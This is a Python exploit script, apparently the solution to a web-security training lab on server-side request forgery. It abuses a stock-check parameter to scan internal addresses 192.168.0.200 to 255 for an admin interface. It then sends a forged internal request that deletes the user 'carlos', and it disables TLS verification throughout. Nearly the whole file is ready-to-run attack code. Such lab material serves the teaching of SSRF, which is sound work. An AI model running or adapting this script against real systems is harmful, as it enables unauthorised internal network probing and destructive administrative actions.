# Lab: Basic SSRF against another back-end system

import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def delete_user (url, admin_ip):
    delete_user_url_ssrf_payload = f'http://{admin_ip}:8080/admin/delete?username=carlos'
    check_stock_path = '/product/stock'
    params = {'stockApi': delete_user_url_ssrf_payload}
    r = requests.post(url + check_stock_path, data = params, verify=False, proxies=proxies)

    # check if the user is deleted
    admin_ssrf_payload = f'http://{admin_ip}:8080/admin'
    params2 = {'stockApi': admin_ssrf_payload}
    r = requests.post(url + check_stock_path, data = params2, verify=False, proxies=proxies)

    if 'User deleted successfully' in r.text:
        print('[+] Successfully deleted user carlos!')
    else:
        print('[-] Exploit was unsuccessful')
    


def check_admin_host (url):
    check_stock_path = '/product/stock'
    admin_ip_addr = ''
    for i in range(200,256):
        hostname = f'http://192.168.0.{i}:8080/admin'
        params = {'stockApi': hostname}
        r = requests.post(url + check_stock_path, data=params, verify=False, proxies=proxies)
        if r.status_code == 200:
            admin_ip_addr = f'192.168.0.{i}'
            break
            
    if admin_ip_addr == '':
        print('[-] no admin host found')
    return admin_ip_addr
    
    
def main():
    if len(sys.argv) != 2:
        print(f'[+] Usage: {sys.argv[0]}')
        print(f'Example: {sys.argv[0]} example.com')
        sys.exit(-1)

    url = sys.argv[1]
    print('[+] Finding admin host...')
    admin_ip_addr = check_admin_host(url)
    print(f'[+] Deleting user Carlos...')
    delete_user (url, admin_ip_addr)

    
if __name__ == '__main__':
    main()